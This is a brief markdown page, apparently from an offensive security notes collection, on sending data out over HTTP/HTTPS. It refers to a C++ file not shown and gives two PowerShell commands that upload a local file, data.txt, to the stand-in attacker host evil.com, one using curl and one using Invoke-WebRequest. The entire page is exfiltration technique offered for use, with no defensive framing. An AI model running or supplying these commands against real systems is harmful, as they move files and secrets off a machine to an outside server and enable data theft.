# Send Data via HTTP/HTTPS

## Using C++

See `SendDataViaHTTP.cpp` file.

## Using Commands

- Curl

    ```powershell
    curl -k -F "file=@./data.txt" https://evil.com
    ```

- Invoke-WebRequest (iwr)

    ```powershell
    $content = Get-Content .\data.txt
    iwr -Uri https://evil.com -Method POST -Body $content
    ```